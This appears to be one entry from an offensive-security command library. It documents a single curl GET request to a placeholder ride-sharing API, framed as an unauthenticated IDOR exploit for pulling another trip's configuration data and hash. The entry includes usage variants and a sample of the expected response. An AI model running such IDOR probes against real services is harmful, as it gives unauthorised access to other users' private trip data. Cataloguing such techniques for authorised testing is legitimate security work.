---
data: >-
  curl -X GET "https://api.example.com/v1/config?trip_id=TARGET_TRIP_ID" -H
  "Accept: application/json"
tags:
  - api
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:34.944Z'
id: c1c4a360-2f36-483e-aca5-9a2915bade90
verified: false
validated: true
submitted: true
---
# curl-get-trip-config

## Command

```bash
curl -X GET "https://api.example.com/v1/config?trip_id=TARGET_TRIP_ID" -H "Accept: application/json"
```

## Description

This command performs an unauthenticated GET request to retrieve trip configuration data, including a generated hash, for a specified trip_id in a ride-sharing API. Use it to exploit IDOR for initial data access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `trip_id=TARGET_TRIP_ID` | The target trip identifier to query | Yes |
| `-H "Accept: application/json"` | Requests JSON response format | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.example.com/v1/config?trip_id=12345" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://api.example.com/v1/config?trip_id=12345" -H "Accept: application/json" -v
```

## Expected Output

JSON object with trip details and hash, e.g., {"trip_id": "12345", "hash": "abc123def", "config": {...}}. HTTP 200 on success; parse for the hash field.

## Related

- [[Related Procedure]]
